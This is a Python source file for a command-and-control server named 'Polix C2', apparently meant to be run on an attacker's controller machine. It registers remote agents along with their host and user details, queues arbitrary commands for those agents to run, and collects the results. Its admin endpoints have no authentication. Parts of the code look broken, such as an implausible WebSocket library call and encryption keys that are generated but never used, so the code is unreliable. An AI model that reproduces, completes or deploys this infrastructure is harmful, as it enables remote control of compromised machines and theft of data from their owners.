#!/usr/bin/env python3
"""
Polix C2 Server - Complete Implementation
Run this on your controller machine
"""

import os
import sys
import json
import ssl
import sqlite3
import threading
import time
import random
import base64
import hashlib
import secrets
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import websocket
import websocket_server
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

app = Flask(__name__)
CORS(app)

class C2Server:
    def __init__(self):
        self.agents = {}
        self.pending_commands = {}
        self.encryption_keys = {}
        self.db_init()
        
    def db_init(self):
        """Initialize SQLite database"""
        self.conn = sqlite3.connect('c2_server.db', check_same_thread=False)
        cursor = self.conn.cursor()
        
        # Agents table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                agent_id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                os TEXT,
                arch TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                status TEXT,
                encryption_key TEXT
            )
        ''')
        
        # Commands table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                command TEXT,
                status TEXT,
                result TEXT,
                created_at TIMESTAMP,
                executed_at TIMESTAMP,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        self.conn.commit()
    
    def generate_keys(self, agent_id):
        """Generate unique encryption keys for an agent"""
        # Generate random encryption key
        encryption_key = base64.b64encode(secrets.token_bytes(32)).decode()
        
        # Generate session key
        session_key = secrets.token_hex(32)
        
        # Store in database
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE agents SET encryption_key = ? WHERE agent_id = ?
        ''', (encryption_key, agent_id))
        self.conn.commit()
        
        return {
            'encryption_key': encryption_key,
            'session_key': session_key
        }
    
    def register_agent(self, agent_data):
        """Register a new agent"""
        agent_id = agent_data['agent_id']
        
        cursor = self.conn.cursor()
        
        # Check if agent exists
        cursor.execute('SELECT * FROM agents WHERE agent_id = ?', (agent_id,))
        existing = cursor.fetchone()
        
        if not existing:
            # New agent
            cursor.execute('''
                INSERT INTO agents (agent_id, hostname, username, os, arch, first_seen, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                agent_id,
                agent_data['hostname'],
                agent_data['username'],
                agent_data['os'],
                agent_data['arch'],
                datetime.now(),
                datetime.now(),
                'active'
            ))
            self.conn.commit()
        
        # Generate keys for this agent
        keys = self.generate_keys(agent_id)
        
        # Store in memory
        self.agents[agent_id] = {
            'info': agent_data,
            'last_seen': datetime.now(),
            'status': 'active'
        }
        
        return keys
    
    def receive_beacon(self, agent_id, beacon_data):
        """Process agent heartbeat"""
        # Update last seen
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE agents SET last_seen = ?, status = ? WHERE agent_id = ?
        ''', (datetime.now(), 'active', agent_id))
        self.conn.commit()
        
        # Check for pending commands
        cursor.execute('''
            SELECT id, command FROM commands 
            WHERE agent_id = ? AND status = 'pending'
            ORDER BY created_at ASC
        ''', (agent_id,))
        
        pending = cursor.fetchall()
        
        if pending:
            commands_list = [{'id': cmd[0], 'command': cmd[1]} for cmd in pending]
            return {'status': 'commands_pending', 'commands': commands_list}
        
        return {'status': 'ok'}
    
    def add_command(self, agent_id, command):
        """Add a command to the queue for an agent"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO commands (agent_id, command, status, created_at)
            VALUES (?, ?, ?, ?)
        ''', (agent_id, command, 'pending', datetime.now()))
        self.conn.commit()
        
        return cursor.lastrowid
    
    def receive_result(self, agent_id, command_id, output):
        """Store command result"""
        cursor = self.conn.cursor()
        cursor.execute('''
            UPDATE commands 
            SET status = 'completed', result = ?, executed_at = ?
            WHERE id = ? AND agent_id = ?
        ''', (output, datetime.now(), command_id, agent_id))
        self.conn.commit()
        
        print(f"[+] Received result for command {command_id} from {agent_id}")
    
    def get_agents_list(self):
        """Get list of all agents"""
        cursor = self.conn.cursor()
        cursor.execute('''
            SELECT agent_id, hostname, username, os, last_seen, status 
            FROM agents ORDER BY last_seen DESC
        ''')
        
        agents = []
        for row in cursor.fetchall():
            agents.append({
                'agent_id': row[0],
                'hostname': row[1],
                'username': row[2],
                'os': row[3],
                'last_seen': row[4],
                'status': row[5]
            })
        
        return agents

# Initialize server
server = C2Server()

# ============ HTTP API Endpoints ============

@app.route('/api/register', methods=['POST'])
def api_register():
    """Agent registration endpoint"""
    try:
        data = request.json
        keys = server.register_agent(data)
        print(f"[+] New agent registered: {data['agent_id']} from {data['hostname']}")
        return jsonify(keys), 200
    except Exception as e:
        print(f"[-] Registration error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/beacon', methods=['POST'])
def api_beacon():
    """Agent beacon endpoint"""
    try:
        agent_id = request.headers.get('X-Agent-ID')
        encrypted_data = request.data.decode()
        
        # For now, accept plaintext for debugging
        # In production, decrypt here
        
        response = server.receive_beacon(agent_id, {})
        return jsonify(response), 200
    except Exception as e:
        print(f"[-] Beacon error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/result', methods=['POST'])
def api_result():
    """Command result endpoint"""
    try:
        agent_id = request.headers.get('X-Agent-ID')
        encrypted_data = request.data.decode()
        
        # Parse result (simplified for debugging)
        # In production, decrypt first
        result_data = json.loads(encrypted_data)
        
        server.receive_result(
            agent_id,
            result_data['command_id'],
            result_data['output']
        )
        
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        print(f"[-] Result error: {e}")
        return jsonify({'error': str(e)}), 500

# ============ Admin API (for GUI) ============

@app.route('/api/admin/agents', methods=['GET'])
def api_get_agents():
    """Get list of all agents for GUI"""
    agents = server.get_agents_list()
    return jsonify(agents), 200

@app.route('/api/admin/send_command', methods=['POST'])
def api_send_command():
    """Send command to agent"""
    data = request.json
    agent_id = data['agent_id']
    command = data['command']
    
    command_id = server.add_command(agent_id, command)
    print(f"[*] Command {command_id} queued for {agent_id}: {command}")
    
    return jsonify({'command_id': command_id, 'status': 'queued'}), 200

@app.route('/api/admin/commands/<agent_id>', methods=['GET'])
def api_get_commands(agent_id):
    """Get command history for an agent"""
    cursor = server.conn.cursor()
    cursor.execute('''
        SELECT id, command, status, result, created_at, executed_at
        FROM commands WHERE agent_id = ? ORDER BY created_at DESC
        LIMIT 50
    ''', (agent_id,))
    
    commands = []
    for row in cursor.fetchall():
        commands.append({
            'id': row[0],
            'command': row[1],
            'status': row[2],
            'result': row[3],
            'created_at': row[4],
            'executed_at': row[5]
        })
    
    return jsonify(commands), 200

# ============ WebSocket Server for Real-time ============

class WebSocketServer:
    def __init__(self, port=8765):
        self.port = port
        self.clients = {}
        self.server = None
        
    def handle_message(self, client, server, message):
        """Handle WebSocket messages"""
        try:
            data = json.loads(message)
            
            if data.get('type') == 'auth':
                agent_id = data.get('agent_id')
                self.clients[agent_id] = client
                print(f"[+] WebSocket authenticated: {agent_id}")
                client.send(json.dumps({'type': 'auth_success'}))
            
            elif data.get('type') == 'command_result':
                print(f"[*] Command result via WS from {data.get('agent_id')}")
                
        except Exception as e:
            print(f"[-] WebSocket error: {e}")
    
    def start(self):
        """Start WebSocket server"""
        try:
            self.server = websocket_server.WebSocketServer(
                host='0.0.0.0',
                port=self.port,
                on_message=self.handle_message
            )
            
            print(f"[+] WebSocket server started on port {self.port}")
            
            # Run in separate thread
            thread = threading.Thread(target=self.server.run_forever)
            thread.daemon = True
            thread.start()
            
        except Exception as e:
            print(f"[-] Failed to start WebSocket server: {e}")

# ============ Main Entry Point ============

def main():
    print("=" * 60)
    print(" Polix C2 Server v1.0")
    print("=" * 60)
    
    # Start WebSocket server
    ws_server = WebSocketServer(8765)
    ws_server.start()
    
    # Generate self-signed cert for HTTPS (for production)
    # For development, we'll use HTTP
    
    print("\n[*] HTTP API Server starting on http://0.0.0.0:8443")
    print("[*] WebSocket server on ws://0.0.0.0:8765")
    print("\n[!] For production, use HTTPS with proper certificates")
    print("[!] Run admin GUI on http://localhost:5000")
    print("\n" + "=" * 60)
    
    # Run Flask app
    app.run(host='0.0.0.0', port=8443, debug=False, threaded=True)

if __name__ == '__main__':
    main()
